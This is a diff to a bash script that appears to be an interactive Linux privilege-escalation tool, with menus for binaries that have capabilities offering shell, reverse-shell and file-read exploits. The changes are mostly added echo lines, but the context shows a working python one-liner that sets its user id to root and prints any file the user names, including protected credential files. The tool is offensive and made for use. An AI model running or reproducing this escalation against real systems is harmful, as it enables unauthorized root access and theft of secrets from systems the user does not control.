@@ -160,7 +160,10 @@ while true; do
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
             else
+                echo "Availables Binaries to Exploit : "
+                echo " "
                 echo "$ShellCap"
+                echo " "
             fi
 
             select choice in $ShellCap "Go Back"; do
@@ -188,7 +191,10 @@ while true; do
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
             else
+                echo "Availables Binaries to Exploit : "
+                echo " "
                 echo "$RevShellCap"
+                echo " "
             fi
 
             select choice in $RevShellCap "Go Back"; do
@@ -215,14 +221,19 @@ while true; do
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
             else
+                echo "Availables Binaries to Exploit : "
+                echo " "
                 echo "$FileReadCap"
+                echo " "
             fi
 
             select choice in $FileReadCap "Go Back"; do
                 case "$choice" in
                     *python*)
                         read -p "What file do you want to read ? : " FILE
-                        echo "Trying with python3"
+                        echo "Trying with python3..."
+                        echo "Result : "
+                        echo " "
                         "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
                         
                         read -p "Do you want to read another file? [y/N] : " answer
